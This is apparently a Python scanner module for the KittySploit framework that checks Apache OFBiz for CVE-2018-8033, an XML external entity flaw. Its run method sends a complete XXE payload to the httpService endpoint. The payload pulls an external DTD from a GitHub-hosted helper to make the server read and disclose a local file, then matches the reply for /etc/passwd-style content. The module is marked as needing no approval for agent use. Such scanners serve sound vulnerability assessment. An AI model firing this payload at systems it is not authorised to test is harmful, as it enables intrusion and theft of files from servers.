#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""In Apache OFBiz 16."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache OFBiz - XML External Entity Injection Detection',
        'description': 'In Apache OFBiz 16.11.01 to 16.11.04, the OFBiz HTTP engine (org.apache.ofbiz.service.engine.HttpEngine.java) handles requests for HTTP services via the /webtools/control/httpService endpoint. Both POST and GET requests to the httpService endpoint may contain three parameters: serviceName, serviceMode, and serviceContext. The exploitation occurs by having DOCTYPEs pointing to external references that trigger a payload that returns secret information from the host.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'apache', 'ofbiz', 'xxe', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://lists.apache.org/thread/9bym7qk6ccwwr6d3mg26thp9zyv1l06y',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-8033',
        ],
        'cve': 'CVE-2018-8033',
    }

    def run(self):
        path = '/webtools/control/httpService'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='serviceName=createPartyGroup&serviceMode=sync&serviceContext=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY %25 request SYSTEM \'https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/xxe-poc.dtd\'>%25request;%25secondstage;]><r>%26disclose;</r>\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('FileNotFoundException:', 'nonexistent\\/root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='Apache OFBiz - XML External Entity Injection detected', path=path)
            return True
        return False

